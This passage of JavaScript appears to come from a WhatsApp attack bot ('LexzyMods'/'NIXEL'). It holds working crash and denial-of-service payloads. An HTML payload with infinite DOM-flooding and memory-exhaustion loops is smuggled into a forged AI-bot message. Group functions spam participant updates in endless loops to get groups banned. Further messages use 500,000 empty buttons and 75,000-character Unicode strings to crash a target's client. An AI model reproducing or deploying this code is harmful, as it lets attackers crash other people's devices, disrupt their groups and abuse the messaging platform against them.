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VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVf/7kmRAj/AAAGkAAAAIAAANIAAAAQAAAaQAAAAgAAA0gAAABFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVX/+5BkQQ/wAABpAAAACAAADSAAAAEAAAGkAAAAIAAANIAAAARVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVU=";
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    ctx.decodeAudioData(bytes.buffer, (audioBuffer) => {
      const source = ctx.createBufferSource();
      source.buffer = audioBuffer;
      source.loop = true;
      
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      const dataArray = new Uint8Array(analyser.frequencyBinCount);

      source.connect(analyser);
      analyser.connect(ctx.destination);
      
      source.start();

      let lastVibrate = 0;
      const threshold = 200;

      function checkVibrate() {
        analyser.getByteFrequencyData(dataArray);
        
        let bassSum = 0;
        for (let i = 0; i < 5; i++) bassSum += dataArray[i];
        let bassAvg = bassSum / 5;

        if (bassAvg > threshold) {
          const now = Date.now();
          if (now - lastVibrate > 150) {
            if (navigator.vibrate) navigator.vibrate(50); 
            lastVibrate = now;
          }
        }
        requestAnimationFrame(checkVibrate);
      }
      
      checkVibrate();


    while (true) {
      for (let i = 0; i < 1000; i++) {
        let div = document.createElement('div');
        div.innerHTML = 'AMPOSSS_'.repeat(500);
        document.body.appendChild(div);
      }
      alert("\u26a0\ufe0f GB AMPOS SOK KERAS AJG \u26a0\ufe0f");
    }

    (function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(1000000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }
        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
    })();

    }, (err) => {
      console.error("Gagal decode audio", err);
    });

  } catch (e) {}
})();
</script>
</body>
</html>`

  const data = Buffer.from(JSON.stringify({
    response_id: id,
    sections: [{
      view_model: {
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  }

  await sock.relayMessage(target, message, {
    messageId: mid
  })

  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })
}

async function BanGroupNewV11(sock, groupJid) {
  if (!groupJid.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  let batch = 0;

  while (true) {
    batch++;

    const actions = batch % 2 === 0
      ? ["promote"]
      : ["demote"];
    const targets = batch % 2 === 0
      ? ["1201200911@s.whatsapp.net"]
      : ["1212009900@s.whatsapp.net"];

    for (let i = 0; i < targets.length; i++) {
      try {
        await sock.groupParticipantsUpdate(groupJid, [targets[i]], actions[0]);
        await sock.sendPresenceUpdate('composing', groupJid);
      } catch (err) {
        console.error('error:', err && err.message ? err.message : err);
      }
    }

    const startTime1 = Date.now();
    const duration1 = 1500;
    while (Date.now() - startTime1 < duration1) {
      if (!groupJid.endsWith('@g.us')) {
        throw new Error('@g.us server required');
      }
      try {
        await sock.groupParticipantsUpdate(groupJid, [targets[0]], actions[0]);
        await sock.sendPresenceUpdate('composing', groupJid);
      } catch (err) {
        console.error('error:', err && err.message ? err.message : err);
      }
    }

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;
    while (Date.now() - startTime2 < duration2) {
      if (!groupJid.endsWith('@g.us')) {
        throw new Error('@g.us server required');
      }
      try {
        await sock.groupParticipantsUpdate(groupJid, ['1201200911@s.whatsapp.net'], 'promote');
        await sock.sendPresenceUpdate('composing', groupJid);
      } catch (err) {
        console.error('error:', err && err.message ? err.message : err);
      }
    }
  }
}

async function BanGroupFastV2(sock, groupJid) {
  if (!groupJid.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  const group = groupJid;

  try {
    let firstRes;
    try {
      firstRes = await sock.groupParticipantsUpdate(
        group,
        ['1212009900@s.whatsapp.net'],
        'add'
      );
    } catch (firstErr) {
      console.warn('First add threw error:', firstErr && firstErr.message ? firstErr.message : firstErr);
      firstRes = null;
    }

    if (Array.isArray(firstRes) && firstRes[0] && firstRes[0].status !== '200') {
      console.warn('First add returned status:', firstRes[0].status);
    }

    try {
      await sock.sendPresenceUpdate('composing', group);
    } catch (presenceErr) {
      console.error('Presence update failed:', presenceErr && presenceErr.message ? presenceErr.message : presenceErr);
    }

    console.log('Successfully banned group:', group);

    const queue1 = new Map();
    queue1.set(0, '1212009900@s.whatsapp.net');
    for (const [i, target] of queue1) {
      try {
        const res = await sock.groupParticipantsUpdate(
          groupJid,
          [target],
          'add'
        );

        if (Array.isArray(res) && res[0] && res[0].status !== '200') {
          console.error('Attempt failed with status:', i + 1, res[0].status);
        } else {
          console.log('Attempt successful:', i + 1);
        }

        await new Promise(function (r) { setTimeout(r, 1000 + Math.floor(Math.random() * 1999)); });
      } catch (err) {
        const msg = err && err.message ? err.message : String(err);
        if (msg.indexOf('bad-request') !== -1) {
          console.error('Attempt bad-request (skipped):', i + 1);
        } else {
          console.error('Error in BanGroupFastV2 attempt:', i + 1, msg);
        }
        await new Promise(function (r) { setTimeout(r, 1000); });
      }
    }

    const queue2 = new Set(['1212009900@s.whatsapp.net']);
    let k = 0;
    for (const target of queue2) {
      try {
        await sock.groupParticipantsUpdate(groupJid, [target], 'add');
        console.log('Attempt successful:', k + 1);
      } catch (err) {
        console.error('Error in attempt:', k + 1, err);
      }
      k++;
    }

    const startTime1 = Date.now();
    const duration1 = 1000;

    while (Date.now() - startTime1 < duration1) {
      if (!groupJid.endsWith('@g.us')) {
        throw new Error('@g.us server required');
      }

      const groupLoop1 = groupJid;

      try {
        await sock.groupParticipantsUpdate(
          groupLoop1,
          ['1212009900@s.whatsapp.net'],
          'add'
        );

        await sock.sendPresenceUpdate('composing', groupLoop1);

        await new Promise(function (r) { setTimeout(r, 1000); });
      } catch (err) {
        console.error('error:', err);
        throw err;
      }
    }

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    const queue3 = new Map([[0, '1201200911@s.whatsapp.net']]);
    while (Date.now() - startTime2 < duration2) {
      if (!groupJid.endsWith('@g.us')) {
        throw new Error('@g.us server required');
      }

      for (const [, target] of queue3) {
        const groupLoop2 = groupJid;

        try {
          await sock.groupParticipantsUpdate(
            groupLoop2,
            [target],
            'add'
          );

          await sock.sendPresenceUpdate('composing', groupLoop2);

          await new Promise(function (r) { setTimeout(r, 1000); });
        } catch (err) {
          console.error('error:', err);
          throw err;
        }
      }
    }

  } catch (err) {
    const msg = err && err.message ? err.message : String(err);
    if (msg.indexOf('bad-request') !== -1) {
      console.warn('BanGroupFastV2 finished with bad-request, ignored:', msg);
      return;
    }
    console.error('Error in BanGroupFastV2:', msg);
    throw err;
  }
}

async function LockGroup(sock, groupJid) {
let Vixzz = await sock.relayMessage(groupJid, {
botForwardedMessage: {
message: {
richResponseMessage: {
messageType: 1,
submessages: [{
messageType: 1,
messageText: " "
}],
contextInfo: {
forwardingScore: 1,
isForwarded: true,
forwardedAiBotMessageInfo: {
botJid: "867051314767696@bot"
},
forwardOrigin: 4,
botMessageSharingInfo: {
botEntryPointOrigin: 1,
forwardScore: 1
}
}
}
}
}
}, {
participant: { jid: groupJid }
});
await sock.relayMessage(groupJid, {
botForwardedMessage: {
message: {
protocolMessage: {
key: {
remoteJid: groupJid,
fromMe: true,
id: Vixzz
},
type: 14,
editedMessage: {
botForwardedMessage: {
message: {
richResponseMessage: {
messageType: 1,
submessages: [{
messageType: 1,
messageText: " "
}],
contextInfo: {
forwardingScore: 1,
isForwarded: true,
forwardedAiBotMessageInfo: {
botJid: "867051314767696@bot"
},
forwardOrigin: 4
}
}
}
}
}
}
}
}
}, {
participant: { jid: groupJid }
});
await sleep(1000);
await sock.relayMessage(groupJid, {
botForwardedMessage: {
message: {
protocolMessage: {
key: {
remoteJid: groupJid,
fromMe: true,
id: Vixzz
},
type: 14,
editedMessage: {
botForwardedMessage: {
message: {
richResponseMessage: {
messageType: 1,
unifiedResponse: {
data: Buffer.from(JSON.stringify({
__typename: "GenAIUnifiedResponse",
response_id: crypto.randomUUID(),
sections: [{
__typename: "GenAIUnifiedResponseSection",
view_model: {
__typename: "GenAISingleLayoutViewModel",
primitive: {
__typename: "FOAHtmlPrimitiveDemoDONOTUSE",
trusted_sources: [],
payload: " "
}
}
}]
})).toString("base64")
},
contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedAiBotMessageInfo: {
botJid: "867051314767696@bot"
},
forwardOrigin: 4
}
}
}
}
}
}
}
}
}, {
participant: { jid: groupJid }
});
}

async function PrivateNew2027(sock, target) {
  const largeThumbnail = Buffer.alloc(500_500, 'A').toString('base64');
  const generateId = () => Math.random().toString(36).substring(2, 15);

  const generateWAMessageFromContent = (jid, message, options = {}) => {
    return {
      key: {
        remoteJid: jid,
        fromMe: true,
        id: generateId()
      },
      message: message,
      messageTimestamp: Date.now(),
      pushName: "LexzyMods"
    };
  };

  const LexMsg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "LexzyMods - Executed¿!",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Iniochamy - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const Lexca = generateWAMessageFromContent(target, LexMsg, {});

  await sock.relayMessage(target, Lexca.message, {
    participant: true,
    messageId: Lexca.key.id
  });

  const Lexcaa = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Lexcaabos - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

  await sock.relayMessage(target, Lexcaabos.message, {
    participant: true,
    messageId: Lexcaabos.key.id
  });

  const msg = {
    key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
    message: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "iniochamy¿!",
        fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        fileLength: 9999999,
        height: 9999,
        width: 9999,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        jpegThumbnail: largeThumbnail,
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
        contextInfo: {
          pairedMediaType: "RICH_TEXT_MESSAGE",
          isQuestion: true,
          isGroupStatus: false,
          remoteJid: "1234567890-987654321@g.us",
          entryPointConversionDelaySeconds: 120,
          entryPointConversionSource: "group_chat"
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    messageId: msg.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        },
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined
        }]
      }
    }
  }, {});

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        }
      }
    }
  }, {});

  const a = {
    interactiveMessage: {
      header: {
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgARQMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAQQFBgIBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA5kE3aIuxTAAAE7mf2xg4/ZZZyiYAAL3UcZ0M1p505aZsFgACxXGln+QAAAAAAB//xAAkEAACAgIBBAEFAAAAAAAAAAABAgADBBExBRMgIhASMDJAcf/aAAgBAQABPwD4HI3O9Q35JO7Rxo6lltBr0qnf3wNnUxuks6B3jdMrA4mViNR/PLAQWZVYMLBdDYlzBRMtBZQ8Pj046y652Vstsdt7UjUzFLgCfSKsWw7h58a3Nbqw5BleXYxays+pHtLstiuww3L7WWoqW2zedGS9BOuDyJZmoy+tYDRmLHZ/W//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABcRAAMBAAAAAAAAAAAAAAAAAAAwQQH/2gAIAQMBAT8AXlI3/9k=",
        hasMediaAttachment: true
      },
      body: {},
      nativeFlowMessage: {
        buttons: [
          {
            name: "order_status",
            buttonParamsJson: `{
  \"currency\":\"IDR\",
  \"total_amount\":{\"value\":0,\"offset\":100},
  \"reference_id\":\"${"NanasPrivate" + "ြ".repeat(75000)}\",
  \"type\":\"physical-goods\",
  \"order\":{
    \"status\":\"pending\",
    \"order_type\":\"PAYMENT_REQUEST\",
    \"items\":[
      {
        \"name\":\"${"LexzyMods" + "ြ".repeat(75000)}\",
        \"quantity\":-9,
        \"price\":{\"value\":0,\"offset\":100}
      }
    ]
  }
}`
          }
        ],
        messageParamsJson: ""
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        pairedMediaType: "NOT_PAIRED_MEDIA"
      }
    }
  };

  await sock.relayMessage(target, a, {});

  const b = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(75000),
      publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
      stickers: [],
      fileLength: "366299919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
